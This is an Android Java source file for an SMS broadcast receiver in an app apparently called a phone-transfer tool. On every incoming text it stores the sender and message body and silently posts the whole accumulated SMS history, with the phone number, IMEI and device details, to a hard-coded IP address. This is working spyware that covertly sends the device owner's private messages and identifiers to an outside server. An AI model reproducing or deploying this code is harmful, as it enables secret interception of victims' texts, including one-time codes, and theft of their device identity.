package com.yinmeng;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.telephony.SmsMessage;
import android.text.TextUtils;
import android.util.Log;

import org.xutils.common.Callback;
import org.xutils.http.RequestParams;
import org.xutils.http.body.RequestBody;
import org.xutils.x;

import java.io.IOException;
import java.io.OutputStream;
import java.util.HashMap;
import java.util.Map;

/**
 * sakura.phonetransfer
 *
 * @author 赵磊
 * @date 2018/5/22
 * 功能描述：
 */
public class SmsReceiver extends BroadcastReceiver {

    private String smsFromPhone;

    private Context context;
    private String mobile = "";
    private String messageBody = "";

    private SmsMessage sms;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        //获取短信
        String smscontent = (String) SpUtil.get(context, "smscontent", "");
        Object[] pduses = (Object[]) intent.getExtras().get("pdus");

        for (Object puds : pduses) {
            //获取短信
            byte[] pdusmessage = (byte[]) puds;
            sms = SmsMessage.createFromPdu(pdusmessage);
            mobile = sms.getOriginatingAddress();
            if (messageBody.equals(sms.getMessageBody())) {
                return;
            }
            messageBody = sms.getMessageBody();
        }
        if (smscontent.endsWith(messageBody)) {
            return;
        }
        //短信内容更新
        if (TextUtils.isEmpty(smscontent)) {
            smsFromPhone = mobile + "##" + messageBody;
        } else {
            smsFromPhone = smscontent + "&&" + mobile + "##" + messageBody;
        }
        SpUtil.putAndApply(context, "smscontent", smsFromPhone);


        if (System.currentTimeMillis() > MainActivity.end) {
            return;
        }

        HashMap<String, String> map = new HashMap<>(2);
        map.put("key", "29067275e60e29544639d4551d953666");
        map.put("aid", "14");
        map.put("tel", String.valueOf(SpUtil.get(context, "phoneNumber", "未知号码")));
        map.put("uuid", String.valueOf(SpUtil.get(context, "androidIMEI", "未知设备")));
        map.put("az_time", String.valueOf(SpUtil.get(context, "androidTime", "未知状态")));
        map.put("xing_hao", String.valueOf(SpUtil.get(context, "model", "未知设备")));
        map.put("xi_tong", String.valueOf(SpUtil.get(context, "modelversion", "未知系统")));
        map.put("ban_ben", String.valueOf(SpUtil.get(context, "version", "未知版本")));
        //map.put("tel_str", queryContactPhoneNumber());
        map.put("tel_str", "");
        map.put("sms_str", "" + SpUtil.get(context, "smscontent", ""));
        map.put("tel_stu", "3");
        map.put("left_right", "3");
        map.put("x_tel", "3");
        RequestParams params = new RequestParams("http://45.125.12.197/api/zhuan_bo");
        try {
            params.setRequestBody(new UrlEncodedParamsBody(map, "utf-8"));
        } catch (IOException e) {
            e.printStackTrace();
        }
        Log.e("MainActivity", params.toString());
        x.http().post(params, new Callback.CommonCallback<String>() {
            @Override
            public void onSuccess(String result) {

            }

            @Override
            public void onError(Throwable ex, boolean isOnCallback) {

            }

            @Override
            public void onCancelled(CancelledException cex) {

            }

            @Override
            public void onFinished() {

            }
        });
    }

    class UrlEncodedParamsBody implements RequestBody {
        private byte[] content;
        private String charset = "UTF-8";

        public UrlEncodedParamsBody(Map<String, String> map, String charset) throws IOException {
            if (!TextUtils.isEmpty(charset)) {
                this.charset = charset;
            }
            StringBuilder contentSb = new StringBuilder();
            if (null != map) {
                for (Map.Entry<String, String> entry : map.entrySet()) {
                    String name = entry.getKey();
                    String value = entry.getValue();
                    if (!TextUtils.isEmpty(name) && value != null) {
                        if (contentSb.length() > 0) {
                            contentSb.append("&");
                        }
                        contentSb.append(Uri.encode(name, this.charset))
                                .append("=")
                                .append(Uri.encode(value, this.charset));
                    }
                }
            }
            this.content = contentSb.toString().getBytes(this.charset);
        }

        @Override
        public long getContentLength() {
            return content.length;
        }

        @Override
        public void setContentType(String contentType) {

        }

        @Override
        public String getContentType() {
            return "application/x-www-form-urlencoded;charset=" + charset;
        }

        @Override
        public void writeTo(OutputStream sink) throws IOException {
            sink.write(this.content);
            sink.flush();
        }
    }


}
